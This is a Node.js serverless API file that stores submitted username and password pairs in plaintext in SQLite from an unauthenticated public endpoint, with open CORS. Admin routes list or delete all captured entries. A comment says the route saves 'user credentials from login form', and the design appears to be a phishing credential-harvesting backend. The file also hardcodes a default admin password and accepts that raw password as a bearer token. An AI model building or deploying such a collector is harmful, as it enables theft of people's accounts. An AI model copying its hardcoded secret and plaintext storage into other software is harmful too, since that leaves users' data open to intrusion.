const path = require('node:path');
const os = require('node:os');
const crypto = require('node:crypto');
const { DatabaseSync } = require('node:sqlite');

// Load .env locally if available
if (typeof process.loadEnvFile === 'function') {
  try {
    process.loadEnvFile();
  } catch {
    // Ignore missing .env (e.g. on Vercel where env vars are injected)
  }
}

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Gexture187';

// Generate a deterministic auth token for the current ADMIN_PASSWORD
function getExpectedToken() {
  return crypto.createHash('sha256').update(`lagos-admin:${ADMIN_PASSWORD}`).digest('hex');
}

// Determine database path:
// On Vercel serverless environments, root filesystem is read-only. Writable storage is in os.tmpdir().
const DB_PATH = process.env.VERCEL
  ? path.join(os.tmpdir(), 'data.sqlite')
  : path.join(process.cwd(), 'data.sqlite');

let dbInstance = null;

function getDatabase() {
  if (!dbInstance) {
    dbInstance = new DatabaseSync(DB_PATH);
    dbInstance.exec(`
      CREATE TABLE IF NOT EXISTS records (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        input1 TEXT NOT NULL,
        input2 TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);
  }
  return dbInstance;
}

function parseBody(req) {
  return new Promise((resolve) => {
    if (req.body && typeof req.body === 'object') {
      return resolve(req.body);
    }
    if (typeof req.body === 'string') {
      try {
        return resolve(JSON.parse(req.body));
      } catch {
        return resolve({});
      }
    }

    let raw = '';
    req.on('data', (chunk) => {
      raw += chunk;
    });
    req.on('end', () => {
      try {
        resolve(JSON.parse(raw || '{}'));
      } catch {
        resolve({});
      }
    });
  });
}

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-admin-token');
}

function checkAdminAuth(req) {
  const authHeader = req.headers['authorization'] || '';
  const tokenHeader = req.headers['x-admin-token'] || '';
  const expectedToken = getExpectedToken();

  const bearerToken = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : authHeader;
  return bearerToken === expectedToken || tokenHeader === expectedToken || bearerToken === ADMIN_PASSWORD;
}

module.exports = async function handler(req, res) {
  setCors(res);

  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    return res.end();
  }

  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = url.pathname;

  // 1. Admin Verification: POST /api/admin-auth or /api/auth
  if (req.method === 'POST' && (pathname.includes('/auth') || url.searchParams.get('action') === 'auth')) {
    const data = await parseBody(req);
    const providedPass = data.password || data.adminPassword || '';

    if (providedPass === ADMIN_PASSWORD) {
      const token = getExpectedToken();
      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: true,
        token,
        message: 'Admin authenticated successfully.'
      }));
    } else {
      res.statusCode = 401;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: false,
        error: 'Invalid admin password.'
      }));
    }
  }

  let db;
  try {
    db = getDatabase();
  } catch (err) {
    console.error('[Vercel DB Init Error]', err);
    res.statusCode = 500;
    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({
      success: false,
      error: 'Failed to initialize SQLite database: ' + err.message
    }));
  }

  // 2. Public POST /api/records -> Save user credentials from login form
  if (req.method === 'POST') {
    try {
      const data = await parseBody(req);
      const input1 = data.input1 ?? data.username ?? '';
      const input2 = data.input2 ?? data.password ?? '';

      if (!input1 || !input2) {
        res.statusCode = 400;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: false,
          error: 'Both input fields are required.'
        }));
      }

      const stmt = db.prepare('INSERT INTO records (input1, input2) VALUES (?, ?)');
      stmt.run(String(input1), String(input2));

      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: true,
        message: 'Saved to SQLite database successfully!'
      }));
    } catch (err) {
      console.error('[DB Insert Error]', err);
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: false,
        error: 'Database error: ' + err.message
      }));
    }
  }

  // Admin Protected Routes: GET and DELETE require admin credentials
  if (!checkAdminAuth(req)) {
    res.statusCode = 401;
    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({
      success: false,
      error: 'Unauthorized: Admin authentication required.'
    }));
  }

  // 3. GET /api/records -> Retrieve all records (Admin only)
  if (req.method === 'GET') {
    try {
      const stmt = db.prepare('SELECT * FROM records ORDER BY id DESC');
      const records = stmt.all();

      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: true,
        count: records.length,
        records
      }));
    } catch (err) {
      console.error('[DB Select Error]', err);
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: false,
        error: 'Database error: ' + err.message
      }));
    }
  }

  // 4. DELETE /api/records -> Delete single or all records (Admin only)
  if (req.method === 'DELETE') {
    try {
      const id = req.query?.id || url.searchParams.get('id');

      if (id) {
        const stmt = db.prepare('DELETE FROM records WHERE id = ?');
        stmt.run(Number(id));
        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: true,
          message: `Record #${id} deleted.`
        }));
      } else {
        const stmt = db.prepare('DELETE FROM records');
        stmt.run();
        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: true,
          message: 'All records cleared.'
        }));
      }
    } catch (err) {
      console.error('[DB Delete Error]', err);
      res.statusCode = 500;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: false,
        error: 'Database error: ' + err.message
      }));
    }
  }

  res.statusCode = 405;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Method Not Allowed');
};
